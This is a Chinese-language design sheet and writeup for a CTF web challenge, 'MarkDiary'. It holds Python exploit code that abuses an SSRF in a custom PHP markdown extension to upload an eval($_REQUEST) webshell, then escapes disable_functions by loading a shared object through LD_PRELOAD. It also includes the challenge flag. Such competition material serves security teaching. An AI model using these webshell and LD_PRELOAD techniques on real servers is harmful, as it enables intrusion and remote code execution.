# 赛题设计说明

## 题目信息：

* 题目名称：MarkDiary
* 预估难度：中等偏难 （简单/中等偏易/中等偏难/困难）


## 题目描述：
```
My Mark Diary level 2
```

## 题目考点：
```
1. 逆向php拓展
2. SSRF
3. bypass disable_functions via LD_PRELOAD
```

## 思路简述：
进入网站后，有一篇博文给出了提示：本文使用了一个自研的php markdown拓展。因此我们可以下载该拓展文件，逆向后可知该拓展中存在一处SSRF漏洞。上传文件的功能点存在请求IP源检测，可以利用这里的ssrf上传webshell。该拓展中存在调用外部程序，因此可以利用LD_PRELOAD绕过disable_functions。


## 题目提示：
1. SSRF
2. .htaccess php://filter
3. LD_PRELOAD


## 原始 flag 及更新命令：

```shell
    # 原始 flag
    flag{flag_test}
    # ..
    # 更新 flag 命令
    echo 'flag{85c2a01a-55f7-442a-8712-3f6908e1463a}' > /flag
```


## 题目环境：
```
1. ubuntu 14.04 LTS（更新到最新）
2. Apache/2.4.7 (Ubuntu)
3. PHP 5.5.9-1ubuntu4.25
```

## 题目制作过程：
1. 设计好漏洞，编写php相关代码
2. 按照“Docker示例文档.md”来编写Dockerfile，制作好镜像。

## 题目writeup：
![1](./img/1.png)
    伪协议读源码
* 逆向pmarkdown.so可发现一处SSRF，从而访问upload.php
```python
data='504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a'.replace('\n','')
    data=data.decode('hex')
    requests.post(url+'/index.php',data={'debug':"sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n"%data},timeout=timeout)
```
* LD_PRELOAD绕过disable_functions结合pmarkdown插件getshell
```python
requests.post(url+'/index.php',data={'debug':"sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n"%data},timeout=timeout)
    requests.post(url+'/post.php?md=logout.md',data={
        'a':'move_uploaded_file($_FILES["aaa"]["tmp_name"],"/tmp/test.so");'
    },
        files={"aaa":("filename1", open("test.so", "rb"))},
        timeout=timeout)
    requests.post(url+'/post.php?md=logout.md',data={'a':'putenv("LD_PRELOAD=/tmp/test.so");pmark_read("posts/logout.md");'},timeout=timeout)
    data=requests.post(url+'/post.php?md=logout.md',data={
        'a':'print_r(file_get_contents("/tmp/flag"));'
    }).content
    info=re.search(r'flag\{.*\}',data)
    return info.group(0)

```

## 注意事项

1. 题目名称不要有特殊符号，可用下划线代替空格；
2. 根据设计的赛题，自行完善所有文件夹中的信息；
3. 此文件夹下信息未完善的队伍，将扣除一定得分。
